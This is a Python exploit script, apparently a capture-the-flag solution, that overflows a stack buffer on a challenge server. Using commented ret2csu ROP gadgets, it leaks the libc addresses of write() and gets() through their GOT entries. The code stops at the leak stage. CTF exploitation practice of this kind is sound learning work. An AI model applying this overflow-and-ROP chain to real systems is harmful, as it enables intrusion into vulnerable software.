import socket
import struct
import time

# reference: https://bananamafia.dev/post/x64-rop-redpwn/


def p64(n):
    return struct.pack("<Q", n)


if __name__ == "__main__":
    url = "dicec.tf"
    port = 31924

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((url, port))
    sock.recv(2048) # "Your name: "


    pop_gadget = p64(0x4011ca) 
    # part of __libc_csu_init()
    # pop rbx (needs to hold 0 for increment and comparison to rbp)
    # pop rbp (needs to hold 1 for comparison to rbx)
    # pop r12 (needs to hold 1 for stdout)
    # pop r13 (needs to hold address to write bytes from)
    # pop r14 (needs to hold number of bytes to write)
    # pop r15 (needs to hold pointer to write function)
    # ret

    call_gadget = p64(0x4011b0) 
    # part of __libc_csu_init()
    # mov rdx, r14
    # mov rsi, r13
    # mov edi, r12d
    # call qword [r15 + rbx*8]
    
    # below addresses can be found with pwntools, radare2, etc.
    write_got = p64(0x404018) # write() GOT address
    gets_got = p64(0x404020)  # gets() GOT address


    # first part of payload leaks address of write()
    payload = b"A"*72       # overflow buffer up to rip
    payload += pop_gadget   # pops rbx, rbp, r12, r13, r14, r15
    payload += p64(0)       # rbx, needed for comparison check after "call qword"
    payload += p64(1)       # rbp, needed for comparison check after "call qword"
    payload += p64(1)       # r12, ends up in edi
    payload += write_got    # r13, ends up in rsi
    payload += p64(8)       # r14, ends up in rdx
    payload += write_got    # r15, pointer to write() that gets called by call_gadget
    payload += call_gadget  # prints address of write()
    payload += p64(0)*7     # filler for pop instructions after "call qword"

    # second part of payload leaks address of gets()
    payload += pop_gadget   # pops rbx, rbp, r12, r13, r14, r15
    payload += p64(0)       # rbx, needed for comparison check after "call qword"
    payload += p64(1)       # rbp, needed for comparison check after "call qword"
    payload += p64(1)       # r12, ends up in edi
    payload += gets_got     # r13, ends up in rsi
    payload += p64(8)       # r14, ends up in rdx
    payload += write_got    # r15, pointer to write() that gets called by call_gadget
    payload += call_gadget  # print address of gets()
    payload += b"\n" 
    
    sock.send(payload)
    time.sleep(0.2) # slight pause to prevent accidently terminating early
    addresses = sock.recv(2048)
    write_addr = bytes(reversed(addresses[:8])).hex()
    gets_addr = bytes(reversed(addresses[8:16])).hex()

    # libc version and offsets can be looked up using leaked addresses and https://libc.blukat.me/
    print("write:", write_addr)
    print("gets:", gets_addr)
